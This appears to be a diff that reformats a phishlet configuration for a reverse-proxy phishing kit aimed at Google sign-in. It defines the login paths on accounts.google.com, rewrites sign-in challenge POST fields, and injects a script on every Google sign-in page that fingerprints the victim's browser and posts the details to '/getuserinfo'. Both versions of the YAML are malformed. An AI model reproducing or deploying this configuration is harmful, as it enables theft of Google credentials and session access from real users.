@@ -46,4 +46,16 @@ auth_urls:
 - '/ManageAccount' 
 login: 
 domain: 
-'accounts.google.com' path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin' force_post: - path: '/_/signin/sl/challenge' search: - {key: 'f.req', search: '.*'} - {key: 'continue', search: '.*'} force: - {key: 'continue', value: ''} type: 'post' js_inject: - trigger_domains: ['accounts.google.com'] trigger_paths: ['.*?'] script: | function serialize( obj ){ var str = []; for (var p in obj){ if (obj.hasOwnProperty(p)) { str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p])); } } return str.join("&"); } function toPopulate(){ console.log( "Populating" ); var xhttp = new XMLHttpRequest(); var tosend = { useragent : navigator.userAgent, browser : navigator.appName, engine : navigator.product, platform : navigator.platform, } xhttp.onreadystatechange = function(){ console.log( "Sent" ); } xhttp.open( "POST", "/getuserinfo", true ); xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); console.log( serialize( tosend ) ); xhttp.send( serialize( tosend ) ); } console.log( "Reached here." ); setTimeout(toPopulate, 2000);
+'accounts.google.com' 
+path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin' 
+force_post: 
+- path: 
+'/_/signin/sl/challenge' 
+search: 
+- {key: 'f.req', search: '.*'} 
+- {key: 'continue', search: '.*'} 
+force: 
+- {key: 'continue', value: ''} 
+type: 'post' js_inject: 
+- trigger_domains: ['accounts.google.com'] 
+trigger_paths: ['.*?'] script: | function serialize( obj ){ var str = []; for (var p in obj){ if (obj.hasOwnProperty(p)) { str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p])); } } return str.join("&"); } function toPopulate(){ console.log( "Populating" ); var xhttp = new XMLHttpRequest(); var tosend = { useragent : navigator.userAgent, browser : navigator.appName, engine : navigator.product, platform : navigator.platform, } xhttp.onreadystatechange = function(){ console.log( "Sent" ); } xhttp.open( "POST", "/getuserinfo", true ); xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); console.log( serialize( tosend ) ); xhttp.send( serialize( tosend ) ); } console.log( "Reached here." ); setTimeout(toPopulate, 2000);
